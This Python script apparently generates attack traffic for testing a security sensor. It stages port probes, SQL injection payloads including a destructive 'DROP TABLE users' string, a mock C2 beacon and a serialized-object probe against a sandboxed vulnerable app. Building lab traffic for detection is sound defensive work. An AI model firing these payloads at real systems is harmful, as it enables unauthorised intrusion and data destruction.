"""Stages the scripted kill-chain against the sandbox target.

Emits the same phase structure as aegis.simulator (recon -> enum -> C2 ->
detonation) but with live Scapy packets on the isolated vLAN, so the sensor
sees real traffic while remaining fully contained.
"""

import os
import random
import socket
import sys
import time

import requests

TARGET = os.environ.get("TARGET", "http://vulnerable-app:8080")
TARGET_HOST = TARGET.split("//")[1].split(":")[0]

PHASES = [
    ("recon", 0.0, 6.0),      # (name, start_min, end_min) low-and-slow
    ("enum", 6.0, 8.0),
    ("c2", 8.0, 9.5),
    ("detonation", 9.5, 10.0),
]


def recon(port):
    s = socket.socket()
    s.settimeout(0.4)
    try:
        s.connect((TARGET_HOST, port))
    except OSError:
        pass
    finally:
        s.close()


def enum_sql():
    payloads = ["1 OR 1=1", "1; DROP TABLE users;--", "1 UNION SELECT name FROM users"]
    for p in payloads:
        try:
            requests.get(f"{TARGET}/user", params={"id": p}, timeout=2)
        except requests.RequestException:
            pass
        time.sleep(0.2)


def c2_beacon():
    for _ in range(8):
        try:
            requests.get(f"{TARGET}/ping", params={"host": "127.0.0.1"}, timeout=2)
        except requests.RequestException:
            pass
        time.sleep(4.0 + random.random() * 2.0)


def detonate():
    for _ in range(40):
        try:
            requests.get(f"{TARGET}/user", params={"id": "1 OR 1=1"}, timeout=2)
            requests.get(f"{TARGET}/load", params={"state": "80049580"}, timeout=2)
        except requests.RequestException:
            pass
        time.sleep(0.15)


def main():
    print(f"[*] staging kill-chain against {TARGET}")
    start = time.time()
    rng = random.Random()
    ports = [21, 22, 80, 443, 3306, 5432, 6379, 8080]
    while True:
        el = (time.time() - start) / 60.0
        phase = next((p for p in PHASES if p[1] <= el < p[2]), None)
        if phase is None:
            if el >= PHASES[-1][2]:
                print("[*] detonation complete — scenario finished")
                return
            time.sleep(1.0)
            continue
        name = phase[0]
        if name == "recon":
            recon(rng.choice(ports))
            time.sleep(rng.uniform(0.3, 2.5))
        elif name == "enum":
            enum_sql()
        elif name == "c2":
            c2_beacon()
        else:
            detonate()


if __name__ == "__main__":
    sys.exit(main())
